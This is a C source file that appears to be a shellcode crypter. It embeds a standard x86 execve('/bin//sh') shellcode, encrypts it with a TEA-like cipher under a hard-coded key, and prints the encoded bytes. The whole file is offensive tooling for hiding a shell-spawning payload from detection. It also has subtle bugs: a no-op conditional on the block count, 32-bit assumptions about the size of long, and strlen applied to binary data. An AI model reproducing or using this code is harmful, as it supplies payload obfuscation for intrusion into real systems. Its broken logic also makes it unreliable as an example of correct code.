#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define BLOCKSIZE 8

void encrypt(long *v, long *k) {
    unsigned long v0=v[0], v1=v[1], sum=0, i;
    unsigned long delta=0x9e3779b9;
    unsigned long k0=k[0], k1=k[1], k2=k[2], k3=k[3];
    for (i=0; i < 32; i++) {
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }
    v[0]=v0;
    v[1]=v1;
}

void encryptBlocks(char *dataptr_in, char *keyptr_in) {

    int i = 0, blockcount;
    long *dataptr = (long *)dataptr_in;
    long *keyptr = (long *)keyptr_in;

    blockcount = strlen(dataptr_in) / BLOCKSIZE;
    blockcount = 0 ? 1 : blockcount; 

    while (i < blockcount) {
        encrypt(dataptr + (i * 2), keyptr);
        i += 1;
    }

}

void printShellCode(char *shellcode) {

    int i;

    printf("Length = %d, Shellcode = ", strlen(shellcode)); 
    for(i=0; i<strlen(shellcode); i++) {
        printf("\\x%02x", (unsigned char)(int)shellcode[i]);
    }
    printf("\n");

}

int main(int argc, char *argv[]) {

    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    unsigned char key[] = "tiptiptiptiptip8";

    char *str;
    str = shellcode;

    printf("[Original]\n");
    printShellCode(shellcode);
    
    encryptBlocks(str, key);

    printf("[Encrypted]\n");
    printShellCode(str);
    printf("\n");

    return 0;

}
